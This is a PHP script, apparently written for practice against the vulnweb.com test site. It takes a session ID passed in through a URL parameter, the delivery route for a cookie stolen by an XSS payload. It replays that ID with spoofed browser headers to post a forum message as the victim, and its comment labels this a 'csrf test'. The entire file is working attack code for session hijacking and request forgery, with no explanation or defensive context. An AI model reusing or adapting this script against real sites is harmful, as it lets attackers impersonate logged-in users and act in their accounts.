
<?php
  $a="This is legal site!";
  $b="Mail l1l1l1l11l1l111l1ll1l1i1i1li1l1@tils.w.a if you want (this csrf test)";
  $c=$_GET["ASPSESSIONIDQCDQDTTT"];
  $url="http://testasp.vulnweb.com/showthread.asp?id=64";
  $d=array("tfSubject"=>$a, "tfText"=>$b);

  function post($url, $d, $c)
  {
    $ch=curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($d));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10);
    $headers=[
      "Host: testasp.vulnweb.com",
      "Cache-Control: max-age=0",
      "Origin: http://testasp.vulnweb.com",
      "Upgrade-Insecure-Requests: 1",
      "Content-Type: application/x-www-form-urlencoded",
      "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
      "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
      "Referer: http://testasp.vulnweb.com/showforum.asp?id=0",
      "Accept-Encoding: gzip, deflate",
      "Accept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7",
      "Cookie: ASPSESSIONIDQCDQDTTT=".$c,
      "Connection: close"
    ];
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

    $response=curl_exec($ch);
    $hc=curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    return $hc.$response;
  }

  echo post($url, $d, $c);
?>
